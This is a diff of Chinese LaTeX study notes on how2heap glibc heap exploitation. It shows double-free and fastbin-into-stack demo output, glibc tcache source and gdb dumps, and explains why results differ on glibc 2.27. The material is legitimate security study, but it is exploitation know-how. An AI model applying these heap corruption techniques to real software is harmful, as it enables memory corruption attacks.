@@ -563,7 +563,7 @@ gef> x/30gx 0x0000000000602000+0x10                  <-- heap base
 发现还是tcache的影响，我们和之前的操作一样，只需要在\verb+ free+和\verb+ malloc+前后分别填满和置空tcache就可以了。但是，与之前的不同的是，从\verb+ unsorted bins+中取出chunks的时候，会先放置在tcache bins中，然后再从 tcache bin 中取出。
 那么问题就来了，在放进 tcache bin 的这个过程中，malloc 会以为我们的 target address 也是一个 chunk，然而这个 "chunk" 是过不了检查的，将抛出 "memory corruption" 的错误。如下方的处理逻辑：
 
-\begin{minted}[brraklines, frame=lines]{c}
+\begin{minted}[breaklines, frame=lines]{c}
 // in malloc.c, line 3788
 while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
     {
@@ -677,42 +677,115 @@ malloc(0x100): 0x7ffe370742b0
 
 \subsection{fastbin\_dup}
 
-编译运行，依然可以利用成功：
+编译运行，可以成功运行，攻击看上去是成功的，但是结果有一点不同：
 \begin{minted}[breaklines, frame=lines]{bash}
 $ how2heap-227 ./fastbin_dup            
+➜ ./fastbin    
+This file demonstrates a simple double-free attack with fastbins.
 Allocating 3 buffers.
-1st malloc(9) 0x24c6260 points to AAAAAAAA
-2nd malloc(9) 0x24c6280 points to BBBBBBBB
-3rd malloc(9) 0x24c62a0 points to CCCCCCCC
-Freeing the first one 0x24c6260.
-Then freeing another one 0x24c6280.
-Freeing the first one 0x24c6260 again.
-Allocating 3 buffers.
-4st malloc(9) 0x24c6260 points to DDDDDDDD the first time
-5nd malloc(9) 0x24c6280 points to EEEEEEEE
-6rd malloc(9) 0x24c6260 points to FFFFFFFF the second time
+1st malloc(8): 0x8a5260
+2nd malloc(8): 0x8a5280
+3rd malloc(8): 0x8a52a0
+Freeing the first one...
+If we free 0x8a5260 again, things will crash because 0x8a5260 is at the top of the free list.
+So, instead, we'll free 0x8a5280.
+Now, we can free 0x8a5260 again, since it's not the head of the free list.
+Now the free list has [ 0x8a5260, 0x8a5280, 0x8a5260 ]. If we malloc 3 times, we'll get 0x8a5260 twice!
+1st malloc(8): 0x8a5260
+2nd malloc(8): 0x8a5280
+3rd malloc(8): 0x8a5260
 
 \end{minted}
 
 \subsection{fastbin\_dup\_into\_stack}
 
-编译运行，可以利用成功：
+编译运行，可以发现我们实际得到的地址和我们想得到的地址差了\verb+ 0x10+：
 \begin{minted}[breaklines, frame=lines]{bash}
 $ how2heap-227 ./fastbin_dup_into_stack 
+This file extends on fastbin_dup.c by tricking malloc into
+returning a pointer to a controlled location (in this case, the stack).
+The address we want malloc() to return is 0x7ffc77f4dbd8.
 Allocating 3 buffers.
-1st malloc(9) 0x7b4260 points to AAAAAAAA
-2nd malloc(9) 0x7b4280 points to BBBBBBBB
-3rd malloc(9) 0x7b42a0 points to CCCCCCCC
-Freeing the first one 0x7b4260.
-Then freeing another one 0x7b4280.
-Freeing the first one 0x7b4260 again.
-Allocating 4 buffers.
-4nd malloc(9) 0x7b4260 points to 0x7ffd81252860
-5nd malloc(9) 0x7b4280 points to EEEEEEEE
-6rd malloc(9) 0x7b4260 points to FFFFFFFF
-7th malloc(9) 0x7ffd81252850 points to GGGGGGGG
+1st malloc(8): 0x189d260
+2nd malloc(8): 0x189d280
+3rd malloc(8): 0x189d2a0
+Freeing the first one...
+If we free 0x189d260 again, things will crash because 0x189d260 is at the top of the free list.
+So, instead, we'll free 0x189d280.
+Now, we can free 0x189d260 again, since it's not the head of the free list.
+Now the free list has [ 0x189d260, 0x189d280, 0x189d260 ]. We'll now carry out our attack by modifying data at 0x189d260.
+1st malloc(8): 0x189d260
+2nd malloc(8): 0x189d280
+Now the free list has [ 0x189d260 ].
+Now, we have access to 0x189d260 while it remains at the head of the free list.
+so now we are writing a fake free size (in this case, 0x20) to the stack,
+so that malloc will think there is a free chunk there and agree to
+return a pointer to it.
+Now, we overwrite the first 8 bytes of the data at 0x189d260 to point right before the 0x20.
+*d => 0x7ffc77f4dbc8
+ d => 0x189d260
+&d => 0x7ffc77f4dbd8
+3rd malloc(8): 0x189d260, putting the stack address on the free list
+4th malloc(8): 0x7ffc77f4dbc8
 
 \end{minted}
+
+这也是由于tcache的影响。我们可以在源码中看到，从fastbin中申请chunk时，会触发tcache：
+\begin{minted}[breaklines, frame=lines]{c}
+#if USE_TCACHE
+        /* While we're here, if we see other chunks of the same size,
+       stash them in the tcache.  */
+        size_t tc_idx = csize2tidx (nb);
+        if (tcache && tc_idx < mp_.tcache_bins)
+      {
+        mchunkptr tc_victim;
+
+        /* While bin not empty and tcache not full, copy chunks.  */
+        while (tcache->counts[tc_idx] < mp_.tcache_count
+           && (tc_victim = *fb) != NULL)
+          {
+            if (SINGLE_THREAD_P)
+          *fb = tc_victim->fd;
+            else
+          {
+            REMOVE_FB (fb, pp, tc_victim);
+            if (__glibc_unlikely (tc_victim == NULL))
+              break;
+          }
+            tcache_put (tc_victim, tc_idx);
+          }
+      }
+#endif
+
+\end{minted}
+
+我们可以在\verb+ free()+时放入tcache的调用栈中找到\verb+ tcache_put()+函数：
+\begin{minted}[breaklines, frame=lines]{c}
+static __always_inline void
+tcache_put(mchunkptr chunk, size_t tc_idx)
+{
+    tcache_entry *e = (tcache_entry *)chunk2mem(chunk);
+    assert(tc_idx < TCACHE_MAX_BINS);
+    e->next = tcache->entries[tc_idx];
+    tcache->entries[tc_idx] = e;
+    ++(tcache->counts[tc_idx]);
+}
+
+\end{minted}
+
+可以得知，在Glibc-2.23时，没有tcache的影响下，我们得到的就是第一次得到chunk的头部地址，而在Glibc-2.27，有tcache的影响下，我们得到的是第一次malloc的地址：
+\begin{minted}[breaklines, frame=lines]{bash}
+gef> x/20gx *d-4 
+0x7fffffffe474 : 0x004009d900000000 0x0000002000000000 <-- malloc return 
+0x7fffffffe484 : 0x0060326000000000 0x0060326000000000 <-- *d 
+0x7fffffffe494 : 0x0060328000000000 0x006032a000000000 
+0x7fffffffe4a4 : 0x7e513f0000000000 0x00400a20c55f9209 
+0x7fffffffe4b4 : 0xf7a44b8e00000000 0x0000000000007fff
+
+\end{minted}
+
+因此，实际运行结果和在Glibc-2.23中差了\verb+ 0x10+。
+
 
 \subsection{overlapping\_chunks}
 
